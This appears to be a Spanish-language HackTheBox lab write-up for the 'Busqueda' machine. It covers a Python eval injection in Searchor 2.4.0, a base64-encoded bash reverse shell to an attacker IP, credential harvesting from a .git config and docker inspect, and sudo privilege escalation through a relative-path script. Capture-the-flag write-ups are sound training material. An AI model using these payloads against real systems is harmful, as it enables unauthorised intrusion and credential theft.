@@ -1,0 +1,368 @@
+---
+title: 'Máquina Busqueda'
+categories: ['HackTheBox', 'Easy', 'Linux']
+description: 'Resolución de la máquina Busqueda de HackTheBox'
+logo: '/assets/writeups/busqueda/logo.png'
+tags: ['eval injection', 'Password gathering', 'Gitea', 'Missing Files']
+---
+
+Esta máquina contiene un sitio que utiliza una librería vulnerable a inyección de código, al vulnerarlo y acceder a la máquina, utilizando credenciales almacenadas en un proyecto git abusaremos de un permiso sudoers para un script que ejecuta un archivo inexistente en la ruta donde se ejecute.
+
+<h2>Reconocimiento</h2>
+
+La máquina tiene dos puertos abiertos
+
+```bash
+# Nmap 7.94 scan initiated Mon Aug 14 16:03:05 2023 as: nmap -sS -Pn -n -p- --open --min-rate 500 -oN ports -vvv 10.10.11.208
+Nmap scan report for 10.10.11.208
+Host is up, received user-set (0.17s latency).
+Scanned at 2023-08-14 16:03:05 -04 for 148s
+Not shown: 62246 closed tcp ports (reset), 3287 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+# Nmap done at Mon Aug 14 16:05:33 2023 -- 1 IP address (1 host up) scanned in 147.56 seconds
+```
+
+El puerto 80 nos redirigue a una web llamada "searcher.htb", vamos a agregar dicho dominio a nuestro /etc/hosts
+
+```bash
+10.10.11.208 searcher.htb
+```
+{: file="/etc/hosts" }
+
+Esta web parece ser una especie de ayudante o helper para motores de busqueda
+
+![Searcher](/assets/writeups/busqueda/1.png)
+
+Vamos a ver como funciona
+
+## Intrusión
+
+### svc - searcher.htb
+
+Si interceptamos las peticiones que hace esta web con BurpSuite, veremos que envia lo siguiente
+
+```ini
+engine=Google&query=asd
+```
+
+Nada fuera de lo común, pero en la web principal, en el footer encontramos un indicativo de que se utiliza Flask y una librería llamada Searchor en su versión 2.4.0, podemos asumir que esta librería se utiliza para la función principal de la web.
+
+Buscando por información de esta versión especificamente en GitHub, encontramos un [commit](https://github.com/ArjunSharda/Searchor/commit/29d5b1f28d29d6a282a5e860d456fab2df24a16b) interesante
+
+![Remove eval](/assets/writeups/busqueda/2.png)
+
+Si indigamos en el commit, encontramos la release 2.4.2 donde ese fallo fue solucionado, pero nosotros estamos contra un Searchor 2.4.0 por lo que podemos considerar a esta web vulnerable, lo comprobamos agregando una comilla al parámetro `query` y viendo que el sitio ahora simplemente no nos devuelve nada.
+
+Al ser una inyección de código Python, podemos probar a concatenar valores, como por ejemplo si introducimos esto
+
+```bash
+engine=Google&query=asd'%20%2b%20'uwuowo
+```
+
+La URL en la redirección ahora se altera a:
+
+```bash
+https://www.google.com/search?q=asduwuowo
+```
+
+Como podemos concatenar valores a gusto, conociendo de Python podemos utilizar la función `__import__` para importar la librería `os` y utilizar popen para leer la salida de un comando que al final, se concatenará a la URL
+
+```bash
+engine=Google&query='%20%2b__import__('os').popen('id').read()%2b%20'
+```
+
+```bash
+https://www.google.com/search?q=uid=1000(svc) gid=1000(svc) groups=1000(svc)
+```
+
+Estamos limitados de carácteres para utilizar acá al ser un eval y estarse utilizando las comillas simples para los strings, por lo que vamos a convertir nuestro oneliner a base64 para pasárselo a la utilidad `base64` de Linux y que esta lo pase a una bash.
+
+```bash
+❯ echo "bash -i >& /dev/tcp/10.10.14.192/443 0>&1" | base64
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xOTIvNDQzIDA+JjEK
+```
+
+La query quedaría así
+
+```bash
+'%20%2b__import__('os').system('echo%20YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC4xOTIvNDQzIDA%2bJjEK%20|base64%20-d|bash')%2b%20'
+```
+Al mandar esto y ponernos en escucha en nuestro equipo, recibimos una shell
+
+```bash
+❯ nc -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.11.208 59064
+bash: cannot set terminal process group (1689): Inappropriate ioctl for device
+bash: no job control in this shell
+svc@busqueda:/var/www/app$ script /dev/null -c bash # Inicia un nuevo proceso
+script /dev/null -c bash
+Script started, output log file is '/dev/null'.
+svc@busqueda:/var/www/app$ ^Z # CTRL + Z
+[1]  + 23231 suspended  nc -lvnp 443
+❯ stty raw -echo; fg # Pasa ciertos controles de la terminal
+[1]  + 23231 continued  nc -lvnp 443
+                                    reset xterm # Reinicia y establece el tipo de terminal
+svc@busqueda:/var/www/app$ export TERM=xterm-256color # Consola xterm256
+svc@busqueda:/var/www/app$ bash # Para aplicar cambios
+svc@busqueda:/var/www/app$ stty rows 36 columns 149 # Filas y columnas de la terminal
+```
+
+Una vez dentro, podemos ver en el directorio personal de este usuario la primera flag
+
+```bash
+svc@busqueda:/var/www/app$ cd 
+svc@busqueda:~$ ls
+snap  user.txt
+svc@busqueda:~$ cat user.txt
+e4ad25e5e5c139e8fb6954754******
+```
+
+## Escalada de privilegios
+
+### administrator - gitea.searcher.htb
+
+Buscando por archivos interesantes en el aplicativo, encontramos un repositorio .git
+
+```bash
+svc@busqueda:/var/www/app$ ls -la
+total 20
+drwxr-xr-x 4 www-data www-data 4096 Apr  3 14:32 .
+drwxr-xr-x 4 root     root     4096 Apr  4 16:02 ..
+-rw-r--r-- 1 www-data www-data 1124 Dec  1  2022 app.py
+drwxr-xr-x 8 www-data www-data 4096 Aug 13 23:06 .git
+drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 templates
+```
+
+Por sus archivos encontramos credenciales
+
+```bash
+svc@busqueda:/var/www/app/.git$ ls -la
+total 52
+drwxr-xr-x 8 www-data www-data 4096 Aug 13 23:06 .
+drwxr-xr-x 4 www-data www-data 4096 Apr  3 14:32 ..
+drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 branches
+-rw-r--r-- 1 www-data www-data   15 Dec  1  2022 COMMIT_EDITMSG
+-rw-r--r-- 1 www-data www-data  294 Dec  1  2022 config
+-rw-r--r-- 1 www-data www-data   73 Dec  1  2022 description
+-rw-r--r-- 1 www-data www-data   21 Dec  1  2022 HEAD
+drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 hooks
+-rw-r--r-- 1 root     root      259 Apr  3 15:09 index
+drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 info
+drwxr-xr-x 3 www-data www-data 4096 Dec  1  2022 logs
+drwxr-xr-x 9 www-data www-data 4096 Dec  1  2022 objects
+drwxr-xr-x 5 www-data www-data 4096 Dec  1  2022 refs
+svc@busqueda:/var/www/app/.git$ cat config
+[core]
+	repositoryformatversion = 0
+	filemode = true
+	bare = false
+	logallrefupdates = true
+[remote "origin"]
+	url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
+	fetch = +refs/heads/*:refs/remotes/origin/*
+[branch "main"]
+	remote = origin
+	merge = refs/heads/main
+```
+
+Esta credencial nos muestra un subdominio nuevo que es válido, dichas credenciales son válidas en este sitio.
+
+![Gitea](/assets/writeups/busqueda/3.png)
+
+Pero hay algo para lo que también son válidas estas credenciales... ¡y es nuestro propio usuario!, con esa contraseña podemos ver que tenemos asignado un permiso especial en sudo
+
+```bash
+svc@busqueda:/var/www/app/.git$ sudo -l
+[sudo] password for svc:
+Matching Defaults entries for svc on busqueda:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User svc may run the following commands on busqueda:
+    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
+```
+
+Podemos ejecutar un script en Python como root que solamente puede hacer lo siguiente
+
+```bash
+svc@busqueda:/var/www/app/.git$ sudo -u root /usr/bin/python3 /opt/scripts/system-checkup.py d
+Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)
+
+     docker-ps     : List running docker containers
+     docker-inspect : Inpect a certain docker container
+     full-checkup  : Run a full system checkup
+
+```
+
+Viendo lo de docker, podemos ver que es cierto que la máquina tiene Docker mirando las interfaces de red
+
+```bash
+svc@busqueda:/var/www/app/.git$ ip a
+... [snip]
+3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
+    link/ether 02:42:c3:0f:d8:8b brd ff:ff:ff:ff:ff:ff
+    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
+       valid_lft forever preferred_lft forever
+4: br-c954bf22b8b2: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
+    link/ether 02:42:e0:5c:0c:d2 brd ff:ff:ff:ff:ff:ff
+    inet 172.20.0.1/16 brd 172.20.255.255 scope global br-c954bf22b8b2
+       valid_lft forever preferred_lft forever
+5: br-cbf2c5ce8e95: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
+    link/ether 02:42:94:0a:d2:72 brd ff:ff:ff:ff:ff:ff
+    inet 172.19.0.1/16 brd 172.19.255.255 scope global br-cbf2c5ce8e95
+       valid_lft forever preferred_lft forever
+    inet6 fe80::42:94ff:fe0a:d272/64 scope link 
+       valid_lft forever preferred_lft forever
+...[snip]
+8: vethba3793f@if7: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-cbf2c5ce8e95 state UP group default 
+    link/ether fe:9b:1c:51:e8:19 brd ff:ff:ff:ff:ff:ff link-netnsid 0
+    inet6 fe80::fc9b:1cff:fe51:e819/64 scope link 
+       valid_lft forever preferred_lft forever
+10: vethfe7a049@if9: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-cbf2c5ce8e95 state UP group default 
+    link/ether 06:6d:bd:d8:0c:36 brd ff:ff:ff:ff:ff:ff link-netnsid 1
+    inet6 fe80::10a3:d9ff:fe60:c2e0/64 scope link 
+       valid_lft forever preferred_lft forever
+```
+
+Por las interfaces de tipo veth, podemos asumir que hay dos contenedores corriendo, y es cierto
+
+```bash
+svc@busqueda:/var/www/app/.git$ sudo -u root /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
+CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS        PORTS                                             NAMES
+960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   7 months ago   Up 22 hours   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
+f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   7 months ago   Up 22 hours   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
+```
+
+La utilidad de checkup también nos permite utilizar el comando `docker inspect` en los contenedores, con esto podemos ver sus variables de entorno y propiedades; pero tendremos que utilizar el formato inspect ya que esta utilidad le pasa los parámetros que introducimos al comando `docker [parámetro]`.
+
+Viendo ejemplos en la [documentación de docker](https://docs.docker.com/engine/reference/commandline/inspect/), ya podemos pensar en que cosas sacar de los contenedores; por ejemplo para obtener la configuración del gitea podemos usar:
+
+```bash
+svc@busqueda:/var/www/app/.git$ sudo -u root /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}' gitea
+{"Hostname":"960873171e2e","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"22/tcp":{},"3000/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["USER_UID=115","USER_GID=121","GITEA__database__DB_TYPE=mysql","GITEA__database__HOST=db:3306","GITEA__database__NAME=gitea","GITEA__database__USER=gitea","GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh","PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","USER=git","GITEA_CUSTOM=/data/gitea"],"Cmd":["/bin/s6-svscan","/etc/s6"],"Image":"gitea/gitea:latest","Volumes":{"/data":{},"/etc/localtime":{},"/etc/timezone":{}},"WorkingDir":"","Entrypoint":["/usr/bin/entrypoint"],"OnBuild":null,"Labels":{"com.docker.compose.config-hash":"e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515","com.docker.compose.container-number":"1","com.docker.compose.oneoff":"False","com.docker.compose.project":"docker","com.docker.compose.project.config_files":"docker-compose.yml","com.docker.compose.project.working_dir":"/root/scripts/docker","com.docker.compose.service":"server","com.docker.compose.version":"1.29.2","maintainer":"maintainers@gitea.io","org.opencontainers.image.created":"2022-11-24T13:22:00Z","org.opencontainers.image.revision":"9bccc60cf51f3b4070f5506b042a3d9a1442c73d","org.opencontainers.image.source":"https://github.com/go-gitea/gitea.git","org.opencontainers.image.url":"https://github.com/go-gitea/gitea"}}
+```
+
+¿Ya viste que hay algo interesante en todo ese JSON? está la contraseña de la base de datos... si probamos esa contraseña con administrator funciona.
+
+### root - searcher.htb
+
+En los repositorios del usuario que hemos comprometido encontramos uno interesante llamado `administrator/scripts`
+
+![Scripts](/assets/writeups/busqueda/4.png)
+
+Está el script que podemos ejecutar como root, vamos a mirar que hace
+
+```python
+#!/bin/bash
+import subprocess
+import sys
+
+actions = ['full-checkup', 'docker-ps','docker-inspect']
+
+def run_command(arg_list):
+    r = subprocess.run(arg_list, capture_output=True)
+    if r.stderr:
+        output = r.stderr.decode()
+    else:
+        output = r.stdout.decode()
+
+    return output
+
+
+def process_action(action):
+    if action == 'docker-inspect':
+        try:
+            _format = sys.argv[2]
+            if len(_format) == 0:
+                print(f"Format can't be empty")
+                exit(1)
+            container = sys.argv[3]
+            arg_list = ['docker', 'inspect', '--format', _format, container]
+            print(run_command(arg_list)) 
+        
+        except IndexError:
+            print(f"Usage: {sys.argv[0]} docker-inspect <format> <container_name>")
+            exit(1)
+    
+        except Exception as e:
+            print('Something went wrong')
+            exit(1)
+    
+    elif action == 'docker-ps':
+        try:
+            arg_list = ['docker', 'ps']
+            print(run_command(arg_list)) 
+        
+        except:
+            print('Something went wrong')
+            exit(1)
+
+    elif action == 'full-checkup':
+        try:
+            arg_list = ['./full-checkup.sh']
+            print(run_command(arg_list))
+            print('[+] Done!')
+        except:
+            print('Something went wrong')
+            exit(1)
+            
+
+if __name__ == '__main__':
+
+    try:
+        action = sys.argv[1]
+        if action in actions:
+            process_action(action)
+        else:
+            raise IndexError
+
+    except IndexError:
+        print(f'Usage: {sys.argv[0]} <action> (arg1) (arg2)')
+        print('')
+        print('     docker-ps     : List running docker containers')
+        print('     docker-inspect : Inpect a certain docker container')
+        print('     full-checkup  : Run a full system checkup')
+        print('')
+        exit(1)
+```
+
+En la acción full-checkup intenta ejecutar un script llamado `full-checkup.sh` en la ruta donde se le llame, podemos abusar de esto simplemente creando dicho script en nuestro directorio con el siguiente contenido
+
+```bash
+bash 1>&0
+```
+{: file="full-checkup.sh"}
+
+Creando el fichero y ejecutando la acción, pues
+
+```bash
+svc@busqueda:~/.local$ sudo -u root /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
+ls -la
+total 24
+drwxrwxr-x 5 svc svc 4096 Aug 14 21:32 .
+drwxr-x--- 7 svc svc 4096 Aug 14 18:09 ..
+drwxrwxr-x 2 svc svc 4096 Jun 15  2022 bin
+-rwxr-xr-x 1 svc svc   24 Aug 14 21:31 full-checkup.sh
+drwxrwxr-x 3 svc svc 4096 Mar  1 10:46 lib
+drwx------ 3 svc svc 4096 Jun 15  2022 share
+script /dev/null -c bash
+Script started, output log file is '/dev/null'.
+root@busqueda:/home/svc/.local#
+```
+
+Ya estando como root, podemos tomar la última flag.
+
+```bash
+root@busqueda:/home/svc/.local# cd
+root@busqueda:~# ls
+ecosystem.config.js  root.txt  scripts  snap
+root@busqueda:~# cat root.txt
+ce3c33f316c8bd3937f3e7d2a7******
+```
